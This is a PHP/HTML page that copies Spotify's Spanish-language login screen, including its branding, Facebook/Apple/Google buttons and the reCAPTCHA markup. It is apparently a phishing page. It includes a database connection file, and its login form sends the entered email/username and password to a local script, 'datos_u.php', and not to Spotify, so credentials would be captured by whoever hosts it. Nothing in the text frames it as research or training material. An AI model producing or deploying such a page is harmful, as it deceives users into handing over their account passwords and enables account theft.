<?php include('conexion.php'); ?>

<!DOCTYPE html>
<html id="app" lang="es" dir="ltr" ng-csp="" ng-strict-di="" class="js-focus-visible ng-scope" data-js-focus-visible="">
<head>
  <style class="vjs-styles-defaults">
      .video-js {
        width: 300px;
        height: 150px;
      }

      .vjs-fluid {
        padding-top: 56.25%
      }
  </style>
    <meta charset="utf-8">
    <title ng-bind="('loginTitle' | localize) + ' - Spotify'" class="ng-binding">Iniciar sesión - Spotify</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <base href="/">
    <link rel="icon" href="https://accounts.scdn.co/sso/images/favicon.ace4d8543bbb017893402a1e9d1ac1fa.ico">
  <link href="https://accounts.scdn.co/sso/css/index.07c6e5f74fe3ea0b5622.css" media="screen" rel="stylesheet">

    <script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/UFwvoDBMjc8LiYc1DKXiAomK/recaptcha__es_419.js" crossorigin="anonymous" integrity="sha384-ONf8QBZpHkjaev3J2MNtcZgy7Btlf3B/gmvCF/VQWpGuKc/APaf+PUYgaqYqpWEh"></script>
    <script async="" src="https://www.google-analytics.com/analytics.js"></script><script defer="" src="https://accounts.scdn.co/sso/js/index.07c6e5f74fe3ea0b5622.js" sp-bootstrap=""></script>
    <meta ng-non-bindable="" sp-bootstrap-data="{&quot;phoneFeatureEnabled&quot;:false,&quot;previewEnabled&quot;:false,&quot;user&quot;:false,&quot;tpaState&quot;:&quot;AQB/WvpqlwmACeSzx3cge8RxSUgItS/uP5PDBlQ4aPw73RQ9fnBHhIVMnZKh8oWIauEAy8wXjCx3CjyggjqyKKJaiVPyThbZ50L//JnZ52eFbTJOVoKUiYvM1+RLXnvZs5gqltdyuu3x/YlgXts=&quot;,&quot;BON&quot;:[&quot;0&quot;,&quot;0&quot;,-769278224]}">
  <script charset="utf-8" src="https://accounts.scdn.co/sso/js/0.10ab1e9c9f95d34b4663.js"></script>
  <script charset="utf-8" src="https://accounts.scdn.co/sso/js/1.8f9168651fc3d1fdf55f.js"></script>
  <script charset="utf-8" src="https://accounts.scdn.co/sso/js/2.9fc75c4174634fe694ef.js"></script>
</head>
  <body ng-controller="LoginController" class="ng-scope">
  <!-- ngInclude: template -->
  <div ng-include="template" class="ng-scope">
    <div sp-header="" class="ng-scope">
    <div class="head ">
  <a class="spotify-logo" tabindex="-1" title="Spotify" ng-href="/es" href="/es"></a>
  </div>
  </div>

<div class="container-fluid login ng-scope">
      <recaptcha>
       <script src="https://www.google.com/recaptcha/api.js?render=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39" async="true"></script>
     </recaptcha>
    <div class="content">
    <!-- ngIf: showContinueLabel -->
    <!-- ngIf: status && status !== 200 -->
    <div class="row">
      <div class="col-xs-12">
        <a ng-href="https://www.facebook.com/v7.0/dialog/oauth?client_id=174829003346&amp;state=AQB%2FWvpqlwmACeSzx3cge8RxSUgItS%2FuP5PDBlQ4aPw73RQ9fnBHhIVMnZKh8oWIauEAy8wXjCx3CjyggjqyKKJaiVPyThbZ50L%2F%2FJnZ52eFbTJOVoKUiYvM1%2BRLXnvZs5gqltdyuu3x%2FYlgXts%3D&amp;redirect_uri=https%3A%2F%2Faccounts.spotify.com%2Flogin%2Ffacebook%2Fredirect" class="btn btn-block btn-facebook ng-binding" target="_parent" role="button" analytics-on="click" analytics-category="Login View" analytics-event="Facebook Button" analytics-label="{{" clientid="" }}="" href="https://www.facebook.com/v7.0/dialog/oauth?client_id=174829003346&amp;state=AQB%2FWvpqlwmACeSzx3cge8RxSUgItS%2FuP5PDBlQ4aPw73RQ9fnBHhIVMnZKh8oWIauEAy8wXjCx3CjyggjqyKKJaiVPyThbZ50L%2F%2FJnZ52eFbTJOVoKUiYvM1%2BRLXnvZs5gqltdyuu3x%2FYlgXts%3D&amp;redirect_uri=https%3A%2F%2Faccounts.spotify.com%2Flogin%2Ffacebook%2Fredirect">Continuar con Facebook</a>
      </div>
    </div>
    <div class="row">
      <div class="col-xs-12">
        <a ng-href="https://appleid.apple.com/auth/authorize?client_id=com.spotify.accounts&amp;response_type=code&amp;response_mode=form_post&amp;scope=name%20email&amp;state=AQB%2FWvpqlwmACeSzx3cge8RxSUgItS%2FuP5PDBlQ4aPw73RQ9fnBHhIVMnZKh8oWIauEAy8wXjCx3CjyggjqyKKJaiVPyThbZ50L%2F%2FJnZ52eFbTJOVoKUiYvM1%2BRLXnvZs5gqltdyuu3x%2FYlgXts%3D&amp;redirect_uri=https%3A%2F%2Faccounts.spotify.com%2Flogin%2Fapple%2Fredirect" class="btn btn-block btn-black btn-apple ng-binding" target="_parent" role="button" analytics-on="click" analytics-category="Login View" analytics-event="Apple Button" analytics-label="{{" clientid="" }}="" href="https://appleid.apple.com/auth/authorize?client_id=com.spotify.accounts&amp;response_type=code&amp;response_mode=form_post&amp;scope=name%20email&amp;state=AQB%2FWvpqlwmACeSzx3cge8RxSUgItS%2FuP5PDBlQ4aPw73RQ9fnBHhIVMnZKh8oWIauEAy8wXjCx3CjyggjqyKKJaiVPyThbZ50L%2F%2FJnZ52eFbTJOVoKUiYvM1%2BRLXnvZs5gqltdyuu3x%2FYlgXts%3D&amp;redirect_uri=https%3A%2F%2Faccounts.spotify.com%2Flogin%2Fapple%2Fredirect">Continuar con Apple</a>
      </div>
    </div>
    <div class="row">
      <div class="col-xs-12">
        <a ng-href="/es/login/google" class="btn btn-block btn-default btn-google ng-binding" target="_parent" role="button" analytics-on="click" analytics-category="Login View" analytics-event="Google Button" analytics-label="{{" clientid="" }}="" href="/es/login/google">Continuar con Google</a>
      </div>
    </div>
    <!-- ngIf: phoneBtnEnabled -->

    <div class="row">
      <div class="col-xs-12">
        <div class="divider">
          <strong class="divider-title ng-binding">o</strong>
        </div>
      </div>
    </div>

    <form action="datos_u.php" name="#" method="POST" novalidate="" class="ng-valid-sp-disallow-chars ng-dirty ng-valid-parse ng-valid ng-valid-required">

      <div class="row" ng-class="{'has-error': (accounts.username.$dirty &amp;&amp; accounts.username.$invalid) || invalidCredentials}">
        <div class="col-xs-12">
          <label for="login-username" class="control-label ng-binding">
            Correo electrónico o nombre de usuario
          </label>
          <input ng-model="form.username" type="text" class="form-control input-with-feedback ng-valid-sp-disallow-chars ng-touched ng-dirty ng-valid-parse ng-not-empty ng-valid ng-valid-required" name="n_usuario" id="login-username" placeholder="Correo electrónico o nombre de usuario" required="" sp-disallow-chars=":%&amp;'`´&quot;" sp-disallow-chars-model="usernameDisallowedChars" autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="autofocus" ng-trim="false" ng-change="onInputChange()">
          <!-- ngIf: accounts.username.$dirty && accounts.username.$invalid -->
        </div>
      </div>

      <div class="row" ng-class="{'has-error': (accounts.password.$dirty &amp;&amp; accounts.password.$invalid) || invalidCredentials}">
        <div class="col-xs-12">
          <label for="login-password" class="control-label ng-binding">
            Contraseña
          </label>
          <input ng-model="form.password" type="password" class="form-control input-with-feedback ng-not-empty ng-dirty ng-valid-parse ng-valid ng-valid-required ng-touched" name="pass" id="login-password" placeholder="Contraseña" required="" autocomplete="off" ng-trim="false" ng-change="onInputChange()">
          <!-- ngIf: accounts.password.$dirty && accounts.password.$invalid -->
        </div>
      </div>

      <!-- ngIf: showAutomationKey -->

          <div class="row password-reset">
            <div class="col-xs-12">
              <p>
                <a id="reset-password-link" ng-href="https://www.spotify.com/password-reset/" analytics-on="click" analytics-category="Login View" analytics-event="Forgot Button" analytics-label="" class="ng-binding" href="https://www.spotify.com/password-reset/">¿Has olvidado tu contraseña?</a>
              </p>
            </div>
          </div>

      <div class="row row-submit">
        <div class="col-xs-12 col-sm-6">
          <div class="checkbox">
            <label class="ng-binding">
              <input ng-model="form.remember" type="checkbox" name="remember" analytics-on="checked" analytics-category="Login View" id="login-remember" class="ng-valid ng-empty ng-dirty ng-valid-parse ng-touched">
              Recordarme
              <span class="control-indicator"></span>
            </label>
          </div>
        </div>
        <div class="col-xs-12 col-sm-6">
          <button class="btn btn-block btn-green ng-binding" type="submit" name="iniciar_sesion">Iniciar Sesión</button>
        </div>
      </div>
    </form>

    <div id="sign-up-section">
      <div class="row">
        <div class="col-xs-12">
          <signup class="ng-isolate-scope"><!-- ngIf: showSignup --><div ng-if="showSignup" class="ng-scope">
    <!-- ngIf: showButton --><div ng-if="showButton" class="ng-scope">
        <div class="row">
            <div class="col-xs-12">
                <div class="divider">
                    <!-- ngIf: showOrLabel -->
                </div>
            </div>
        </div>
        <div class="row text-center mt-0">
            <h2 class="h4 ng-binding">¿No tienes cuenta?</h2>
        </div>
        <div>
            <div class="row">
                <div class="col-xs-12">
                    <a id="sign-up-link" ng-href="/es/login/signup?continue=https%3A%2F%2Faccounts.spotify.com%2Fes%2Fstatus" class="btn btn-block btn-default ng-binding" role="button" href="/es/login/signup?continue=https%3A%2F%2Faccounts.spotify.com%2Fes%2Fstatus">Regístrate en Spotify</a>
                </div>
            </div>
        </div>
    </div><!-- end ngIf: showButton -->

    <!-- ngIf: showAppStoreBanner -->
</div><!-- end ngIf: showSignup -->
</signup>
        </div>
      </div>
    </div>

  </div><!-- .content -->
</div><!-- .container -->
</div>


<script>mendeleyWebImporter = { open: function () { window.postMessage('0.652294152518015', 'https://accounts.spotify.com') } }</script><div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo">
  <iframe src="https://www.google.com/recaptcha/api2/anchor?ar=2&amp;k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&amp;co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&amp;hl=es-419&amp;v=UFwvoDBMjc8LiYc1DKXiAomK&amp;size=invisible&amp;cb=6v315cgp2crw" width="256" height="60" role="presentation" name="a-rfw3t10sd7a" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox">

  </iframe>
</div>

<div class="grecaptcha-error">

</div>

<textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;">

</textarea>
</div>

<iframe style="display: none;">

</iframe>
</div>
</body>
</html>
